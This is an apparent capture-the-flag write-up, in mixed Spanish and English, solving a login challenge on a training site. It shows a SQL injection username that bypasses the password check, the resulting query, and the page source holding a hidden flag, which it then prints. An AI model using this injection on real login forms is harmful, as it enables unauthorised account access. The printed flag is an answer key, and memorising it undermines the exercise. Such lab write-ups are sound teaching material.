## Descripcion
Can you login to this website? Try to login [here](http://chatelaine.cylabacademy.net:25339/).
`admin` is the user you want to login as.
## solucion 
```

al intentar iniciar sesion con admin y algunos datos random
username: admin
password: 12345
SQL query: SELECT * FROM users WHERE name='admin' AND password='12345'

# Login failed.

nos muestran la consulta que verifica que seamos admin... a modificarlaaaa

username: admin' AND 1 = 1;
password: 
SQL query: SELECT * FROM users WHERE name='admin' AND 1 = 1;' AND password=''

# Logged in! But can you see the flag, it is in plainsight.

y con ctrl + u
|   |
|---|
|<pre>username: admin&#039; AND 1 = 1;|
|password:|
|SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; AND 1 = 1;&#039; AND password=&#039;&#039;|
|</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: academy{L00k5_l1k3_y0u_solv3d_it_8fcb45de}</p>|

```

```
academy{L00k5_l1k3_y0u_solv3d_it_8fcb45de}
```
## notas adicionales

## referencias
